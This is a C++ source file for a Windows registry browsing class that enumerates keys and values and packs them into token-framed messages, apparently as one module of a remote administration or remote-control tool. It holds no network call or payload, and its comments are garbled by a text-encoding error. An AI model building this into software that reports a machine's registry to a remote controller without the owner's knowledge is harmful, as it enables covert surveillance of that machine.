// RegeditOpt.cpp: implementation of the RegeditOpt class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "RegeditOpt.h"
#include "Registry.h"
#include <stdlib.h>

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
//#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

RegeditOpt::RegeditOpt()
{

}

RegeditOpt::RegeditOpt(char b)
{
	switch(b)
	{
	case MHKEY_CLASSES_ROOT:
		MKEY=HKEY_CLASSES_ROOT;
		break;
	case MHKEY_CURRENT_USER:
		MKEY=HKEY_CURRENT_USER;
		break;
	case MHKEY_LOCAL_MACHINE:
		MKEY=HKEY_LOCAL_MACHINE;
		break;
	case MHKEY_USERS:
		MKEY=HKEY_USERS;
		break;
	case MHKEY_CURRENT_CONFIG:
		MKEY=HKEY_CURRENT_CONFIG;
		break;
	default:
		MKEY=HKEY_LOCAL_MACHINE;
		break;
	}
	ZeroMemory(szSubKey,sizeof(szSubKey));
}

void RegeditOpt::SetPath(char *path)
{
	ZeroMemory(szSubKey,sizeof(szSubKey));
	if(MKEY==HKEY_CURRENT_USER&&lpszUserSid)
	{
		strcat(szSubKey,lpszUserSid);
		strcat(szSubKey,"\\");
	}
    strcat(szSubKey,path);
}

RegeditOpt::~RegeditOpt()
{
	
}

char* RegeditOpt::FindPath()
{
    char	*buf=NULL;
	HKEY	hKey;			//ע����ؾ��
    if(RegOpenKeyEx(MKEY==HKEY_CURRENT_USER&&lpszUserSid?HKEY_USERS:MKEY,szSubKey,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//��
	{
       	DWORD dwIndex=0,NameSize,NameCnt,NameMaxLen,Type;
		DWORD KeySize,KeyCnt,KeyMaxLen,DataSize,DataMaxLen;
        //�����ö����
		if(RegQueryInfoKey(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&DataMaxLen,NULL,NULL)!=ERROR_SUCCESS)
		{
			return NULL;
		}
		//һ�㱣����ʩ
		KeySize = KeyMaxLen+1;
		if(KeyCnt>0 && KeySize>1)
		{
			int size=sizeof(REGMSG)+1;
			
			//buf=new char[KeyCnt*KeySize+size+1];
			DWORD datasize=KeyCnt*KeySize+size+1;
			buf=(char*)LocalAlloc(LPTR, datasize);
			ZeroMemory(buf,datasize);
			buf[0]=TOKEN_REG_PATH;           //����ͷ
			REGMSG msg;                     //����ͷ
			msg.size=KeySize;
			msg.count=KeyCnt;
			memcpy(buf+1,(void*)&msg,size);
			
			char * tmp=new  char[KeySize];
			for(dwIndex=0;dwIndex<KeyCnt;dwIndex++)		//ö����
			{
				ZeroMemory(tmp,KeySize);
				DWORD i=KeySize;
				RegEnumKeyEx(hKey,dwIndex,tmp,&i,NULL,NULL,NULL,NULL);
				strcpy(buf+dwIndex*KeySize+size,tmp);
			}
			delete[] tmp;
			RegCloseKey(hKey);
			buf=(char*)LocalReAlloc(buf, datasize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
	}
	
    return buf;
}

char* RegeditOpt::FindKey()
{
	char	*szValueName;		//��ֵ����
	char	*szKeyName;			//�Ӽ�����
	LPBYTE	szValueDate;		//��ֵ����
	
	char	*buf=NULL;
	HKEY	hKey;			//ע����ؾ��
	if(RegOpenKeyEx(MKEY==HKEY_CURRENT_USER&&lpszUserSid?HKEY_USERS:MKEY,szSubKey,0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)//��
	{
		DWORD dwIndex=0,NameSize,NameCnt,NameMaxLen,Type;
		DWORD KeySize,KeyCnt,KeyMaxLen,DataSize,DataMaxLen;
		//�����ö����
		if(RegQueryInfoKey(hKey,NULL,NULL,NULL,&KeyCnt,&KeyMaxLen,NULL,&NameCnt,&NameMaxLen,&DataMaxLen,NULL,NULL)!=ERROR_SUCCESS)
		{
			return NULL;
		}
		if(NameCnt>0 && DataMaxLen>0)
		{
			NameSize=NameMaxLen*2+2;
			DataSize=DataMaxLen+1;
			REGMSG  msg;
			msg.count=NameCnt;          //�ܵĸ���
			msg.size=NameSize;          //���ִ�С
			msg.valsize=DataSize;       //���ݴ�С
			int msgsize=sizeof(REGMSG);
			//               ͷ                 ���                 ����               ����
			DWORD size=sizeof(REGMSG) + sizeof(BYTE)*NameCnt + NameSize*NameCnt + DataSize*NameCnt + 10;
			buf=(char*)LocalAlloc(LPTR, size);
			ZeroMemory(buf,size);
			buf[0]=TOKEN_REG_KEY;                 //����ͷ
			memcpy(buf+1,(void*)&msg,msgsize);    //����ͷ
			
			szValueName=(char *)malloc(NameSize);
			szValueDate=(LPBYTE)malloc(DataSize);
			
			char *tmp=buf+1+msgsize;
			for(dwIndex=0; dwIndex<NameCnt; dwIndex++)	//ö�ټ�ֵ
			{
				ZeroMemory(szValueName,NameSize);
				ZeroMemory(szValueDate,DataSize);
				
				NameSize=NameMaxLen*2+2;
				DataSize=DataMaxLen+1;
				
				RegEnumValue(hKey,dwIndex,szValueName,&NameSize,NULL,&Type,szValueDate,&DataSize);//��ȡ��ֵ
				
				switch(Type)
				{
				case REG_SZ:
					tmp[0]=MREG_SZ;
					break;
				case REG_DWORD:
					tmp[0]=MREG_DWORD;
					break;
				case REG_QWORD:
					tmp[0]=MREG_QWORD;
					break;
				case REG_BINARY:
					tmp[0]=MREG_BINARY;
					break;
				case REG_EXPAND_SZ:
					tmp[0]=MREG_EXPAND_SZ;
					break;
				case REG_MULTI_SZ:
					tmp[0]=MREG_MULTI_SZ;
					break;
				default:
					continue;
				}
				
				tmp+=sizeof(BYTE);
				strcpy(tmp,szValueName);
				tmp+=msg.size;
				memcpy(tmp,szValueDate,msg.valsize);
				tmp+=msg.valsize;
			}
			free(szValueName);
			free(szValueDate);
			buf=(char*)LocalReAlloc(buf, size, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
	}
	
	return buf;
}
